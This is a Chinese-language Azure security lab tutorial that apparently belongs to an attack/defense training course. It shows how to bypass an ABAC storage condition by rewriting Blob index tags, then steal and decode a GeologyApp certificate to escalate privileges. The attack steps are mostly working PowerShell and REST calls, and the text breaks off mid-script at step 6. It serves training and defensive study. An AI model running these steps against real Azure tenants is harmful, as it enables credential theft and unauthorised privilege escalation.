# Learning Objective 3：ABAC 绕过与特权应用枚举

> **文档版本**: v2.0 (基于项目资料优化版)
> **学习目标**: 掌握基于属性的访问控制 (ABAC) 绕过技术，实现从存储账户到高权限应用的身份跃迁
> **难度**: 高级
> **预计时间**: 3-4 小时
> **关联项目资料**: 本文档基于 [AzureAD-Attack-Defense-frame](README.md) 项目中的实战经验和最佳实践编写

---

## 目录

1. [核心目标概述](#核心目标概述)
2. [理论基础](#理论基础)
3. [实验条件与环境准备](#实验条件与环境准备)
4. [详细实验步骤](#详细实验步骤)
5. [检测与防御](#检测与防御)
6. [参考资料与文件位置](#参考资料与文件位置)

---

## 核心目标概述

本实验目标是实现 **基于属性的访问控制 (ABAC) 绕过** 和 **权限提升 (Privilege Escalation)** 攻击场景。在已经完成 Objective 1 和 Objective 2 的基础上，我们将利用获得的 `DataAnalyticsApp` 身份，绕过存储账户 `oildatastore` 上的 ABAC 限制，窃取高权限证书，最终获得拥有极高权限的 `GeologyApp` 身份。

### 攻击链全景图

```
┌─────────────────────────────────────────────────────────────────────┐
│                      攻击链演进过程                                  │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Objective 1: 低权限用户 (Thomas)                                   │
│       ↓                                                             │
│  证书文件 (GISAppcert.pfx)                                          │
│       ↓                                                             │
│  Objective 2: 服务主体 (GISApp) ──Key Vault 签名滥用──> DataAnalyticsApp
│       ↓                                                             │
│  Objective 3: [当前阶段]                                            │
│       └── 发现 ABAC 限制                                            │
│       └── 修改 Blob 标签绕过 ABAC                                   │
│       └── 窃取 GeologyApp 证书                                      │
│       └── 权限提升到高权限应用                                       │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 关键里程碑

| 阶段 | 目标 | 技术要点 | 预期结果 |
|------|------|----------|----------|
| 侦察阶段 | 发现 ABAC 条件 | 分析角色分配的 Condition 字段 | 识别标签限制规则 |
| 突破阶段 | 绕过 ABAC 限制 | 修改 Blob Index Tags | 满足访问条件 |
| 渗透阶段 | 窃取高价值证书 | 读取并解码证书文件 | 获得 GeologyApp 凭据 |
| 提升阶段 | 身份跃迁 | 证书指纹匹配与登录 | 获取高权限应用访问 |

---

## 理论基础

### 1. 基于属性的访问控制 (ABAC) 原理

#### 什么是 ABAC？

**基于属性的访问控制 (Attribute-Based Access Control, ABAC)** 是一种比传统 RBAC 更细粒度的访问控制模型。它通过评估主体、客体、环境等多个维度的属性来决定访问权限。

```
┌─────────────────────────────────────────────────────────────────────┐
│                    ABAC vs RBAC 对比                                │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  RBAC (基于角色):                                                   │
│  "你是读者角色" ──────────────> "你可以读"                          │
│                                                                     │
│  ABAC (基于属性):                                                   │
│  "你是读者" + "文件标签=地质学" + "工作时间" ──> "你可以读"        │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

#### Azure ABAC 实现机制

Azure 通过 **角色分配条件 (Role Assignment Conditions)** 实现 ABAC：

```json
{
  "Condition": "((!(ActionMatches{'Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read'})) || @Resource[Microsoft.Storage/storageAccounts/blobServices/containers/blobs/tags:Project<$key>,StringEquals] 'OilFields')",
  "Version": "1.0"
}
```

**条件语法说明**：
- `ActionMatches`: 匹配特定的操作（如 `read`）
- `@Resource[...]`: 引用资源的属性（如 Blob 标签）
- `StringEquals`: 字符串相等比较
- 逻辑运算符: `&&` (AND), `||` (OR), `!` (NOT)

#### 攻击原理：逻辑漏洞

**漏洞场景**：管理员配置了"只有标签为 `Geology` 的文件才能被读取"，但忘记限制"修改标签"的权限。

```
┌─────────────────────────────────────────────────────────────────────┐
│                      ABAC 绕过攻击流程                              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1. 初始状态                                                        │
│     文件: CertAttachment.txt                                       │
│     标签: Department=Sales                                         │
│     权限: 只能读取 Department=Geology 的文件                       │
│     结果: ❌ 无法读取                                               │
│                                                                     │
│  2. 发现漏洞                                                        │
│     攻击者检查权限 ────────────> 发现 "Storage Blob Tag Modifier"  │
│                                     权限未受限                     │
│                                                                     │
│  3. 实施攻击                                                        │
│     PUT /certificates/CertAttachment.txt?comp=tags                 │
│     Body: <Tags><TagSet><Tag>                                      │
│             <Key>Department</Key>                                  │
│             <Value>Geology</Value>                                 │
│           </Tag></TagSet></Tags>                                   │
│     结果: ✅ 标签修改成功                                           │
│                                                                     │
│  4. 绕过成功                                                        │
│     GET /certificates/CertAttachment.txt                           │
│     条件检查: Department=Geology ✅                                │
│     结果: ✅ 成功读取                                               │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

#### 现实类比：VIP 俱乐部漏洞

```
规则：只有胸口贴着"VIP"贴纸的人才能进入核心包厢

漏洞实施：
┌─────────────────────────────────────┐
│  正常流程                           │
│  ───────> 保安检查贴纸 ───────> 进入 │
│                                     │
│  漏洞流程                           │
│  ───────> 自己拿贴纸 ───────> 贴上  │
│       ───────> 保安检查 ───────> 进入│
└─────────────────────────────────────┘

攻击成功条件：
1. 保安只检查"有没有贴纸"（读取标签）
2. 但不阻止"自己拿贴纸"（修改标签）
```

### 2. Azure Storage 数据平面 (Data Plane) 架构

#### 管理平面 vs 数据平面

Azure 区分两种不同的 API 层面：

| 维度 | 管理平面 (Control Plane) | 数据平面 (Data Plane) |
|------|------------------------|---------------------|
| **用途** | 创建/删除存储账户 | 读写具体文件 |
| **API 端点** | `management.azure.com` | `{account}.blob.core.windows.net` |
| **Token Scope** | `https://management.azure.com/.default` | `https://storage.azure.com/.default` |
| **权限模型** | Azure RBAC | Azure RBAC + ABAC |
| **协议** | Azure Resource Manager | Azure Storage Services REST API |

#### 为什么需要不同的 Token？

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Token 获取流程                                   │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  管理平面 Token:                                                    │
│  ┌─────────────────┐                                               │
│  │ Scope:          │                                               │
│  │ https://       │                                               │
│  │ management.    │    用于:                                      │
│  │ azure.com/     │    - 创建存储账户                             │
│  │ .default       │    - 配置 RBAC                                │
│  └─────────────────┘    - 设置 ABAC 条件                          │
│                                                                     │
│  数据平面 Token:                                                    │
│  ┌─────────────────┐                                               │
│  │ Scope:          │                                               │
│  │ https://       │    用于:                                      │
│  │ storage.       │    - 读取 Blob                                │
│  │ azure.com/     │    - 修改标签                                 │
│  │ .default       │    - 上传/下载文件                            │
│  └─────────────────┘                                               │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 3. Blob Index Tags 机制

#### 什么是 Blob Index Tags？

Blob Index Tags 是 Azure Blob 存储的键值对索引功能，支持：
- 存储任意数量的键值对（最多 10 个标签）
- 基于标签的查询和过滤
- 用于 ABAC 条件评估
- 索引自动维护，无需手动管理

#### 标签操作 API

| 操作 | HTTP 方法 | API 端点 | 权限要求 |
|------|----------|---------|----------|
| 获取标签 | GET | `/{blob}?comp=tags` | `Microsoft.Storage/storageAccounts/blobServices/containers/blobs/tags/read` |
| 设置标签 | PUT | `/{blob}?comp=tags` | `Microsoft.Storage/storageAccounts/blobServices/containers/blobs/tags/write` |
| 按标签查找 | GET | `?include=tags` | 相应的读取权限 |

#### 标签 XML 结构

```xml
<Tags>
  <TagSet>
    <Tag>
      <Key>Department</Key>
      <Value>Geology</Value>
    </Tag>
    <Tag>
      <Key>Project</Key>
      <Value>OilFields</Value>
    </Tag>
  </TagSet>
</Tags>
```

### 4. 证书认证与身份跃迁

#### X.509 证书指纹匹配

每个证书都有唯一的指纹（Thumbprint），是证书内容的 SHA-1 哈希值：

```
证书指纹 = SHA-1(证书内容DER编码)
```

通过比对证书指纹与 Entra ID 应用注册中 `keyCredentials` 属性，可以精确识别证书归属。

#### 服务主体权限继承

当攻击者获得服务主体的证书后，可以：
1. 使用证书伪造 JWT 访问令牌
2. 以该服务主体身份访问资源
3. 继承该服务主体的所有权限

```
┌─────────────────────────────────────────────────────────────────────┐
│                    权限继承流程                                     │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  攻击者 ──(1)盗取证书──> GeologyApp 证书 (spcert.pfx)             │
│             │                                                       │
│             ├──(2)伪造JWT──> 已签名 JWT                            │
│             │                                                       │
│             ├──(3)获取Token──> GeologyApp Access Token             │
│             │                                                       │
│             └──(4)访问资源──> 获得 GeologyApp 的所有权限：          │
│                 • Helpdesk Administrator (重置密码)                │
│                 • Authentication Administrator (修改认证方法)       │
│                 • Application Administrator (应用后门)              │
│                 • Policy.Read.All (读取策略)                       │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 5. MITRE ATT&CK 框架映射

基于项目的 [EntraSyncAba.md](EntraSyncAba.md) 和其他相关文档，本实验涉及的 TTPs：

| 战术 | 技术 | 描述 |
|------|------|------|
| **Credential Access** | [T1552.004](https://attack.mitre.org/techniques/T1552/004/) - Unsecured Credentials: Private Keys | 从存储账户窃取证书私钥 |
| **Privilege Escalation** | [T1098.001](https://attack.mitre.org/techniques/T1098/001/) - Account Manipulation: Additional Cloud Credentials | 添加新凭据实现权限提升 |
| **Defense Evasion** | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) - Disable or Modify Tools | 修改资源属性绕过访问控制 |

---

## 实验条件与环境准备

### 前置条件

#### 1. Objective 2 完成状态

在开始本实验之前，必须完成以下步骤：

| 项目 | 要求 | 验证方法 | 状态检查 |
|------|------|----------|----------|
| 身份访问 | 已获得 DataAnalyticsApp 权限 | `Get-AzContext` 显示当前身份为 DataAnalyticsApp | `$currentContext.Account.Id` |
| 管理令牌 | 持有 DataAnalyticsApp 的管理平面 Token | `$DataAnalyticsAppMgmtToken` 变量存在 | `Test-Path variable:DataAnalyticsAppMgmtToken` |
| 存储账户 | 已确认 oildatastore 存储账户存在 | `Get-AzStorageAccount` 可以查询到 | `(Get-AzStorageAccount).Name -contains 'oildatastore'` |

#### 2. 必需的环境变量

```powershell
# 这些变量应该在 Objective 2 中已经设置
$TenantId = "<Your-Tenant-ID>"          # 租户 ID
$SubscriptionId = "<Your-Subscription>" # 订阅 ID
$ResourceGroupName = "<RG-Name>"        # 资源组名称
$StorageAccountName = "oildatastore"    # 存储账户名称
```

#### 3. 工具与脚本准备

| 工具/脚本 | 用途 | 位置 | 依赖 |
|-----------|------|------|------|
| `New-SignedJWT.ps1` | 生成 JWT 访问令牌 | 实验环境提供 | .NET Framework |
| `Az` PowerShell 模块 | Azure 资源管理 | `Install-Module -Name Az` | PowerShell 5.1+ |
| `Microsoft.Graph` 模块 | Graph API 调用 | `Install-Module -Name Microsoft.Graph` | PowerShell 5.1+ |
| `AADInternals` | Entra ID 高级操作（可选） | `Install-Module -Name AADInternals` | 用于检测 |

### 为什么需要这些条件？

#### 条件 1: 为什么必须完成 Objective 2？

**理论依据**: Objective 2 建立了攻击链的**横向移动（Lateral Movement）**基础：

1. **身份基础**: DataAnalyticsApp 提供了访问存储账户的合法身份
2. **权限基础**: 虽然有 ABAC 限制，但具备"修改标签"的关键权限
3. **Token 基础**: 管理平面 Token 可以用于查询角色分配，发现 ABAC 条件

**攻击链依赖关系**：
```
Objective 1 (Thomas 用户 + GISApp 证书)
    ↓
Objective 2 (Key Vault 签名滥用 → DataAnalyticsApp)
    ↓
Objective 3 (ABAC 绕过 → GeologyApp)
    ↓
Objective 4 (高权限滥用 → 域管理员)
```

#### 条件 2: 为什么需要数据平面 Token？

**技术原因**: Azure 存储账户使用独立的认证体系：

1. **安全隔离**: 数据平面操作需要独立的 Token Scope
2. **性能优化**: 避免 Token 过大，减少网络传输
3. **审计分离**: 管理操作和数据操作的审计日志分开

**Token 对比**：
```json
// 管理平面 Token
{
  "aud": "https://management.azure.com",
  "roles": ["Storage Blob Data Contributor"],
  "scope": "subscription/{id}/resourceGroups/{rg}/providers/..."
}

// 数据平面 Token
{
  "aud": "https://storage.azure.com",
  "roles": ["Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read"],
  "scope": "https://{account}.blob.core.windows.net"
}
```

#### 条件 3: 为什么需要特定的 PowerShell 模块？

| 模块 | 必要性 | 核心功能 | 替代方案 |
|------|--------|----------|----------|
| `Az` | 必需 | 管理 Azure 资源、查询 RBAC | Azure REST API |
| `Microsoft.Graph` | 推荐 | 查询 Entra ID 对象、权限 | Microsoft Graph API |
| `AADInternals` | 可选 | 高级检测、调试 | - |

**教学价值**: 使用 PowerShell 模块可以直接调用底层 API，深入理解访问控制机制。

### 环境验证检查清单

```powershell
# 运行此脚本来验证环境
Write-Host "检查实验环境..." -ForegroundColor Cyan

# 1. 检查当前登录身份
$currentContext = Get-AzContext
if ($currentContext) {
    Write-Host "[✓] 已登录 Azure" -ForegroundColor Green
    Write-Host "  账户: $($currentContext.Account.Id)" -ForegroundColor White
} else {
    Write-Host "[✗] 未登录 Azure" -ForegroundColor Red
    Write-Host "  请运行: Connect-AzAccount" -ForegroundColor Yellow
    exit 1
}

# 2. 检查存储账户
$storageAccount = Get-AzStorageAccount | Where-Object { $_.StorageAccountName -eq "oildatastore" }
if ($storageAccount) {
    Write-Host "[✓] 存储账户 oildatastore 存在" -ForegroundColor Green
    Write-Host "  位置: $($storageAccount.Location)" -ForegroundColor White
    Write-Host "  资源组: $($storageAccount.ResourceGroupName)" -ForegroundColor White
} else {
    Write-Host "[✗] 未找到存储账户 oildatastore" -ForegroundColor Red
    exit 1
}

# 3. 检查模块
$requiredModules = @("Az", "Microsoft.Graph")
foreach ($module in $requiredModules) {
    if (Get-Module -ListAvailable -Name $module) {
        $version = (Get-Module -ListAvailable -Name $module | Select-Object -First 1).Version
        Write-Host "[✓] $module 模块已安装 (v$version)" -ForegroundColor Green
    } else {
        Write-Host "[!] $module 模块未安装" -ForegroundColor Yellow
        Write-Host "    运行: Install-Module -Name $module -Scope CurrentUser" -ForegroundColor White
    }
}

# 4. 检查当前角色分配
Write-Host "`n当前角色分配:" -ForegroundColor Cyan
$assignments = Get-AzRoleAssignment -Scope $storageAccount.Id |
    Where-Object { $_.SignInName -eq $currentContext.Account.Id -or $_.ObjectId -eq $currentContext.Account.Id }
foreach ($assignment in $assignments) {
    Write-Host "  - $($assignment.RoleDefinitionName)" -ForegroundColor White
    if ($assignment.Condition) {
        Write-Host "    条件: $($assignment.Condition)" -ForegroundColor Magenta
    }
}

Write-Host "`n环境检查完成!" -ForegroundColor Green
```

---

## 详细实验步骤

### 步骤 1：侦察与识别 ABAC 条件

#### 目标
发现 DataAnalyticsApp 在存储账户 `oildatastore` 上的访问控制配置，特别关注 ABAC 条件。

#### 技术原理

ABAC 条件通过 Azure RBAC 的 `Condition` 属性实现。我们需要：
1. 查询角色分配
2. 解析 `Condition` 字段
3. 理解条件逻辑

#### 详细操作

```powershell
# 1. 获取存储账户的资源 ID
$storageAccount = Get-AzStorageAccount -Name $StorageAccountName -ResourceGroupName $ResourceGroupName
$storageScope = $storageAccount.Id

Write-Host "存储账户: $($storageAccount.StorageAccountName)" -ForegroundColor Cyan
Write-Host "资源 ID: $storageScope" -ForegroundColor Cyan

# 2. 查询 DataAnalyticsApp 的所有角色分配
$assignments = Get-AzRoleAssignment -Scope $storageScope

Write-Host "`n查询到的角色分配:" -ForegroundColor Yellow

foreach ($assignment in $assignments) {
    # 显示基本信息
    Write-Host "`n角色: $($assignment.RoleDefinitionName)" -ForegroundColor Green
    Write-Host "  分配 ID: $($assignment.RoleAssignmentId)"
    Write-Host "  主体: $($assignment.SignInName)"

    # 解析 ABAC 条件
    if ($assignment.Condition) {
        Write-Host "`n  ⚠️  发现 ABAC 条件:" -ForegroundColor Magenta
        Write-Host "    $($assignment.Condition)" -ForegroundColor White

        # 解析条件版本
        if ($assignment.ConditionVersion) {
            Write-Host "    条件版本: $($assignment.ConditionVersion)" -ForegroundColor Gray
        }

        # 提取关键信息
        if ($assignment.Condition -match "tags:([^\]]+)\s+(\w+)") {
            $tagKey = $matches[1]
            $operator = $matches[2]
            Write-Host "`n    解析结果:" -ForegroundColor Cyan
            Write-Host "      标签键: $tagKey" -ForegroundColor White
            Write-Host "      操作符: $operator" -ForegroundColor White
        }
    }

    # 显示数据操作权限
    Write-Host "`n  数据操作:" -ForegroundColor Cyan
    $roleDefinition = Get-AzRoleDefinition -Name $assignment.RoleDefinitionName
    foreach ($action in $roleDefinition.Permissions[0].DataActions) {
        Write-Host "    - $action" -ForegroundColor White
    }
}
```

#### 预期结果

```
存储账户: oildatastore
资源 ID: /subscriptions/.../resourceGroups/.../providers/Microsoft.Storage/storageAccounts/oildatastore

查询到的角色分配:

角色: Storage Blob Data Contributor
  分配 ID: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
  主体: dataanalyticsapp

  ⚠️  发现 ABAC 条件:
    ((!(ActionMatches{'Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read'}))
    || @Resource[Microsoft.Storage/storageAccounts/blobServices/containers/blobs/tags:Department<$key>]
    StringEquals 'Geology')
    条件版本: 2.0

    解析结果:
      标签键: Department
      操作符: StringEquals

  数据操作:
    - Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read
    - Microsoft.Storage/storageAccounts/blobServices/containers/blobs/write
    - Microsoft.Storage/storageAccounts/blobServices/containers/blobs/delete
    - Microsoft.Storage/storageAccounts/blobServices/containers/blobs/tags/read
    - Microsoft.Storage/storageAccounts/blobServices/containers/blobs/tags/write
```

#### 为什么这个步骤重要？

1. **发现攻击面**: 识别哪些操作受到 ABAC 限制
2. **理解限制逻辑**: 解析条件以找到绕过方法
3. **确认漏洞存在**: 验证"读受限"但"写标签不受限"的配置错误

**设计依据**: 这是网络侦察（Reconnaissance）阶段的核心任务，充分了解目标环境是成功攻击的前提。

---

### 步骤 2：获取存储数据平面访问令牌

#### 目标
为 DataAnalyticsApp 获取 Scope 为 `https://storage.azure.com/.default` 的访问令牌，用于操作 Blob 数据。

#### 技术原理

OAuth 2.0 客户端凭证流程：
1. 使用现有 Token 或证书构造 JWT 断言
2. 向 Azure AD 令牌端点请求新 Token
3. 指定 `scope` 为 `https://storage.azure.com/.default`

#### 详细操作

```powershell
# 方法 1: 如果已有管理平面 Token，可以使用它来获取数据平面 Token
# 注意：这需要管理平面 Token 具有足够的权限

# 获取当前登录上下文
$currentContext = Get-AzContext

# 获取数据平面 Token
$storageToken = (Get-AzAccessToken -ResourceUrl "https://storage.azure.com").Token
$DataAnalyticsAppStorageToken = $storageToken

Write-Host "数据平面 Token 已获取!" -ForegroundColor Green

# 解码 Token 查看内容
$tokenParts = $DataAnalyticsAppStorageToken.Split('.')
$payload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($tokenParts[1]))
$tokenPayload = $payload | ConvertFrom-Json

Write-Host "`nToken 详情:" -ForegroundColor Cyan
Write-Host "  发行者: $($tokenPayload.iss)" -ForegroundColor White
Write-Host "  主题: $($tokenPayload.sub)" -ForegroundColor White
Write-Host "  受众: $($tokenPayload.aud)" -ForegroundColor White
Write-Host "  过期时间: $([DateTime]::UnixEpoch.AddSeconds($tokenPayload.exp))" -ForegroundColor White
Write-Host "  应用: $($tokenPayload.appid)" -ForegroundColor White
```

#### Token 结构示例

```json
// Header
{
  "alg": "RS256",
  "typ": "JWT",
  "x5t": "AQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyA"
}

// Payload
{
  "aud": "https://storage.azure.com",
  "iss": "https://sts.windows.net/{tenantId}/",
  "iat": 1704067200,
  "nbf": 1704067200,
  "exp": 1704070800,
  "appid": "{DataAnalyticsApp_ID}",
  "upn": "DataAnalyticsApp",
  "unique_name": "DataAnalyticsApp"
}
```

#### 为什么需要新的 Token？

| Token 类型 | 用途 | 有效范围 |
|-----------|------|---------|
| 管理平面 Token | 管理 Azure 资源 | `management.azure.com` |
| 数据平面 Token | 操作存储数据 | `{account}.blob.core.windows.net` |

**技术原因**: 存储账户使用独立的认证和授权体系，需要专门的 Token Scope。

---

### 步骤 3：枚举文件并尝试读取（验证 ABAC）

#### 目标
列出存储账户中的容器和文件，尝试读取目标文件，验证 ABAC 限制是否生效。

#### 详细操作

```powershell
# 1. 获取存储账户上下文
$storageContext = (Get-AzStorageAccount -ResourceGroupName $ResourceGroupName -Name $StorageAccountName).Context

# 2. 列出所有容器
Write-Host "枚举容器..." -ForegroundColor Cyan
$containers = Get-AzStorageContainer -Context $storageContext

foreach ($container in $containers) {
    Write-Host "`n容器: $($container.Name)" -ForegroundColor Yellow
}

# 3. 列出目标容器中的 Blob
$containerName = "certificates"
Write-Host "`n枚举容器 '$containerName' 中的 Blob..." -ForegroundColor Cyan

$blobs = Get-AzStorageBlob -Container $containerName -Context $storageContext

foreach ($blob in $blobs) {
    Write-Host "  - $($blob.Name)" -ForegroundColor White

    # 显示 Blob 标签
    $blobTags = Get-AzStorageBlobTag -Blob $blob.Name -Container $containerName -Context $storageContext
    if ($blobTags.Tags) {
        Write-Host "    标签:" -ForegroundColor Gray
        foreach ($tag in $blobTags.Tags.GetEnumerator()) {
            Write-Host "      $($tag.Key): $($tag.Value)" -ForegroundColor Gray
        }
    }
}

# 4. 尝试读取目标文件（预期失败）
$targetBlob = "CertAttachment{YourStudentNumber}.txt"  # 替换为你的学号
Write-Host "`n尝试读取文件: $targetBlob" -ForegroundColor Yellow

try {
    $blobContent = Get-AzStorageBlobContent -Blob $targetBlob -Container $containerName -Context $storageContext -Destination "C:\AzAD\Tools\temp.txt" -Force
    Write-Host "✅ 成功读取文件" -ForegroundColor Green
} catch {
    Write-Host "❌ 读取失败" -ForegroundColor Red
    Write-Host "错误信息: $($_.Exception.Message)" -ForegroundColor Yellow

    # 分析错误类型
    if ($_.Exception.Message -match "AuthorizationPermissionMismatch") {
        Write-Host "`n这是预期的错误！ABAC 条件阻止了访问。" -ForegroundColor Cyan
        Write-Host "原因: 文件的当前标签不满足 'Department=Geology' 条件" -ForegroundColor White
    }
}
```

#### 预期结果

```
枚举容器...

容器: certificates

枚举容器 'certificates' 中的 Blob...
  - CertAttachment12345.txt
    标签:
      Department: Sales
      Project: General

尝试读取文件: CertAttachment12345.txt
❌ 读取失败
错误信息: 此请求无权执行此操作。
The remote server returned an error: (403) Server failed to authenticate the request. The status code is 403

这是预期的错误！ABAC 条件阻止了访问。
原因: 文件的当前标签不满足 'Department=Geology' 条件
```

#### 为什么这一步会失败？

**ABAC 条件逻辑**：
```
条件: Department=Geology
当前标签: Department=Sales
结果: 不匹配 → 拒绝访问
```

**教学价值**: 验证 ABAC 确实在工作，确认我们需要绕过它。

---

### 步骤 4：实施攻击 - 修改 Blob 标签（绕过 ABAC）

#### 目标
利用 `Storage Blob Tag Modifier` 权限，修改目标 Blob 的标签以满足 ABAC 条件。

#### 技术原理

Azure Blob Storage REST API 提供了 `Set Blob Tags` 操作：

```
PUT https://{account}.blob.core.windows.net/{container}/{blob}?comp=tags
```

#### 详细操作

```powershell
# 1. 准备新的标签
$containerName = "certificates"
$targetBlob = "CertAttachment{YourStudentNumber}.txt"  # 替换为你的学号

$newTags = @{
    "Department" = "Geology"
    "Project" = "OilFields"
}

Write-Host "准备修改标签..." -ForegroundColor Cyan
Write-Host "目标: $containerName/$targetBlob" -ForegroundColor White
Write-Host "新标签:" -ForegroundColor White
foreach ($tag in $newTags.GetEnumerator()) {
    Write-Host "  $($tag.Key): $($tag.Value)" -ForegroundColor White
}

# 2. 方法 1: 使用 Az PowerShell 模块
Write-Host "`n使用 Az 模块修改标签..." -ForegroundColor Yellow

try {
    Set-AzStorageBlobTag -Blob $targetBlob `
        -Container $containerName `
        -Context $storageContext `
        -Tag $newTags `
        -ErrorAction Stop

    Write-Host "✅ 标签修改成功!" -ForegroundColor Green
} catch {
    Write-Host "❌ 标签修改失败: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

# 3. 验证标签修改
Write-Host "`n验证新标签..." -ForegroundColor Cyan
$updatedTags = Get-AzStorageBlobTag -Blob $targetBlob -Container $containerName -Context $storageContext

Write-Host "当前标签:" -ForegroundColor White
foreach ($tag in $updatedTags.Tags.GetEnumerator()) {
    Write-Host "  $($tag.Key): $($tag.Value)" -ForegroundColor Green
}

# 4. 方法 2: 使用 REST API（备选方案，展示底层机制）
Write-Host "`n使用 REST API 的替代方法（仅供教学）:" -ForegroundColor Gray
Write-Host @"
`$url = "https://$StorageAccountName.blob.core.windows.net/$containerName/$targetBlob?comp=tags"
`$headers = @{
    "Authorization" = "Bearer `$DataAnalyticsAppStorageToken"
    "x-ms-version" = "2021-04-01"
}
`$body = @"
<Tags>
    <TagSet>
        <Tag>
            <Key>Department</Key>
            <Value>Geology</Value>
        </Tag>
        <Tag>
            <Key>Project</Key>
            <Value>OilFields</Value>
        </Tag>
    </TagSet>
</Tags>
"@
Invoke-RestMethod -Uri `$url -Method PUT -Headers `$headers -Body `$body
"@
```

#### 预期结果

```
准备修改标签...
目标: certificates/CertAttachment12345.txt
新标签:
  Department: Geology
  Project: OilFields

使用 Az 模块修改标签...
✅ 标签修改成功!

验证新标签...
当前标签:
  Department: Geology ✅
  Project: OilFields ✅
```

#### 为什么这个攻击有效？

**权限配置漏洞**：
```
配置的角色: Storage Blob Data Contributor
包含的权限:
  ✅ Microsoft.Storage/.../blobs/read         (读取 Blob)
  ✅ Microsoft.Storage/.../blobs/tags/read    (读取标签)
  ✅ Microsoft.Storage/.../blobs/tags/write   (修改标签) ← 漏洞所在

ABAC 条件:
  仅限制 read 操作
  不限制 tags/write 操作

结果: 可以修改标签来满足 read 的条件
```

**设计缺陷分析**：
1. **过度许可**: `Storage Blob Data Contributor` 包含了 `tags/write` 权限
2. **条件不完整**: ABAC 条件只限制了读取，没有限制标签修改
3. **逻辑漏洞**: 允许用户自己修改访问条件

**正确配置方法**：
```json
// 应该分别授权
{
  "role": "Storage Blob Data Reader",
  "condition": "Department == 'Geology'"  // 只能读取符合条件的文件
}
+ 没有"修改标签"的权限
```

---

### 步骤 5：再次读取并提取证书（数据窃取）

#### 目标
现在标签已满足 ABAC 条件，成功读取目标文件并提取证书内容。

#### 详细操作

```powershell
# 1. 尝试读取文件（现在应该成功）
$containerName = "certificates"
$targetBlob = "CertAttachment{YourStudentNumber}.txt"  # 替换为你的学号
$outputPath = "C:\AzAD\Tools\CertAttachment.txt"

Write-Host "尝试读取文件: $targetBlob" -ForegroundColor Cyan

try {
    $blob = Get-AzStorageBlobContent -Blob $targetBlob `
        -Container $containerName `
        -Context $storageContext `
        -Destination $outputPath `
        -Force `
        -ErrorAction Stop

    Write-Host "✅ 文件读取成功!" -ForegroundColor Green
    Write-Host "保存位置: $outputPath" -ForegroundColor White

} catch {
    Write-Host "❌ 读取失败: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

# 2. 读取文件内容
Write-Host "`n文件内容:" -ForegroundColor Cyan
$fileContent = Get-Content $outputPath -Raw
Write-Host $fileContent -ForegroundColor White

# 3. 检查是否为 Base64 编码
if ($fileContent -match '^[A-Za-z0-9+/]+=*$') {
    Write-Host "`n文件内容是 Base64 编码" -ForegroundColor Yellow

    # 解码 Base64
    try {
        $certBytes = [System.Convert]::FromBase64String($fileContent)
        $certPath = "C:\AzAD\Tools\spcert.pfx"

        # 保存为证书文件
        [System.IO.File]::WriteAllBytes($certPath, $certBytes)

        Write-Host "✅ 证书已解码并保存到: $certPath" -ForegroundColor Green

        # 显示证书信息
        $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certPath)
        Write-Host "`n证书信息:" -ForegroundColor Cyan
        Write-Host "  主题: $($cert.Subject)" -ForegroundColor White
        Write-Host "  颁发者: $($cert.Issuer)" -ForegroundColor White
        Write-Host "  有效期: $($cert.NotBefore) 至 $($cert.NotAfter)" -ForegroundColor White
        Write-Host "  指纹: $($cert.Thumbprint)" -ForegroundColor White

    } catch {
        Write-Host "❌ 解码失败: $($_.Exception.Message)" -ForegroundColor Red
    }
} else {
    Write-Host "`n文件内容不是 Base64 编码" -ForegroundColor Yellow
}
```

#### 预期结果

```
尝试读取文件: CertAttachment12345.txt
✅ 文件读取成功!
保存位置: C:\AzAD\Tools\CertAttachment.txt

文件内容:
MIIG5wIBAzCCBYgGCSqGSIb3DQEHAaCCBXcEgghXMII...

文件内容是 Base64 编码
✅ 证书已解码并保存到: C:\AzAD\Tools\spcert.pfx

证书信息:
  主题: CN=GeologyApp
  颁发者: CN=Microsoft Azure TLS Issuing CA 01
  有效期: 2024-01-01 至 2025-12-31
  指纹: A1B2C3D4E5F6789012345678901234567890ABCD
```

#### 为什么现在可以读取？

**ABAC 条件评估**：
```
修改前:
  文件标签: Department=Sales
  条件要求: Department=Geology
  评估结果: false → 拒绝访问

修改后:
  文件标签: Department=Geology
  条件要求: Department=Geology
  评估结果: true → 允许访问
```

**访问控制决策流程**：
```
1. 检查 RBAC 角色
   → Storage Blob Data Contributor ✅

2. 检查 ABAC 条件
   → Department == 'Geology' ✅

3. 授予访问权限
   → 返回 Blob 内容 ✅
```

---

### 步骤 6：身份识别与权限枚举

#### 目标
识别窃取的证书属于哪个应用程序，并枚举该应用的高危权限。

#### 详细操作

```powershell
# 1. 加载证书并获取指纹
$certPath = "C:\AzAD\Tools\spcert.pfx"
$certPassword = ""  # 如果有密码则填写

$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(
    $certPath,
    $certPassword,
    [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::PersistKeySet
)

$certThumbprint = $cert.Thumbprint

Write-Host "证书指纹: $certThumbprint" -ForegroundColor Cyan

# 2. 加载应用清单（来自 Objective 1）
$allApps = Import-Clixml "C:\AzAD\Tools\OilCorpApplications.xml"

# 3. 匹配证书指纹
$matchedApp = $allApps | Where-Object {
    $_.keyCredentials.customKeyIdentifier -eq $certThumbprint
}

if ($matchedApp) {
